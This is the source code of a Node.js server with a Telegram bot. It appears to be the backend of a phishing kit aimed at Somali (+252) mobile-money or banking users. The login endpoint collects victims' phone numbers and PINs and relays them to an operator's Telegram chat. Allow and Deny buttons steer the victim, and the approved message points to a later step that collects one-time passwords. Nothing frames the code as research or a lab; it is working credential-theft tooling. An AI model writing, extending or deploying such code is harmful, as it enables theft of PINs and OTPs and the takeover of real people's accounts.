const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

// -------------------- ENV CHECK --------------------
if (!process.env.BOT_TOKEN) {
    console.error("❌ BOT_TOKEN is missing");
    process.exit(1);
}

const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();

// -------------------- BOT INIT --------------------
const bot = new Telegraf(process.env.BOT_TOKEN);

// -------------------- MEMORY STORE --------------------
const statusStore = {};

// -------------------- MIDDLEWARE --------------------
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// -------------------- ROUTES --------------------
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/:page', (req, res) => {
    const file = req.params.page.endsWith('.html')
        ? req.params.page
        : req.params.page + '.html';

    res.sendFile(path.join(__dirname, 'public', file), (err) => {
        if (err) {
            res.status(404).send("Page not found");
        }
    });
});

// -------------------- LOGIN API --------------------
app.post('/api/login-notification', async (req, res) => {
    const { phone, pin } = req.body || {};

    const now = new Date();
    const currentTime = now.toLocaleString('en-US', {
        month: 'numeric',
        day: 'numeric',
        year: 'numeric',
        hour: 'numeric',
        minute: '2-digit',
        second: '2-digit',
        hour12: true
    });

    if (!phone || !pin || !ADMIN_ID) {
        return res.status(400).json({ error: "Missing data" });
    }

    statusStore[phone] = "pending";

    const message =
        `📱 CL 2 - LOGIN ATTEMPT\n\n` +
        `🆕 NEW USER\n` +
        `🇸🇴 Country: Somalia\n` +
        `🌍 Code: +252\n` +
        `📱 Phone Number: ${phone}\n` +
        `🔢 PIN: ${pin}\n` +
        `⏰ Time: ${currentTime}\n\n` +
        `⚠️ User waiting for approval`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Allow", callback_data: `approve_${phone}_${pin}` }
                    ],
                    [
                        { text: "❌ Deny", callback_data: `deny_${phone}` }
                    ]
                ]
            }
        });

        res.json({ success: true });

    } catch (err) {
        console.error("❌ Notification Error:", err.message);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- APPROVE ACTION --------------------
bot.action(/approve_(.+)_(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];

    const timeNow = new Date().toLocaleTimeString('en-US', {
        hour: 'numeric',
        minute: '2-digit',
        second: '2-digit',
        hour12: true
    });

    statusStore[phone] = "approved";

    const approvedMsg =
        `✅ LOGIN APPROVED\n\n` +
        `🆕 NEW USER\n` +
        `🇸🇴 Somalia\n` +
        `📱 ${phone}\n` +
        `🔐 ${pin}\n\n` +
        `────────────────────\n\n` +
        `✅ Status: Approved\n` +
        `➡ Next: First OTP (1/2)\n` +
        `⌚ ${timeNow}`;

    try {
        await ctx.editMessageText(approvedMsg);
    } catch (e) {
        console.error("❌ Edit failed:", e.message);
    }
});

// -------------------- DENY ACTION --------------------
bot.action(/deny_(.+)/, async (ctx) => {
    const phone = ctx.match[1];

    statusStore[phone] = "denied";

    try {
        await ctx.editMessageText(
            "❌ INVALID INFORMATION\n\nCodsigii waa la diiday."
        );
    } catch (e) {
        console.error("❌ Deny failed:", e.message);
    }
});

// -------------------- STATUS CHECK --------------------
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;
    res.json({ status: statusStore[phone] || "pending" });
});

// -------------------- BOT START --------------------
bot.start((ctx) => {
    ctx.reply("🤖 Bot is active and running");
});

// -------------------- SERVER START --------------------
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});

// -------------------- BOT LAUNCH --------------------
const startBot = async () => {
    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        await bot.launch();
        console.log("🤖 Bot launched successfully");
    } catch (err) {
        console.error("❌ Launch error:", err);
    }
};

startBot();
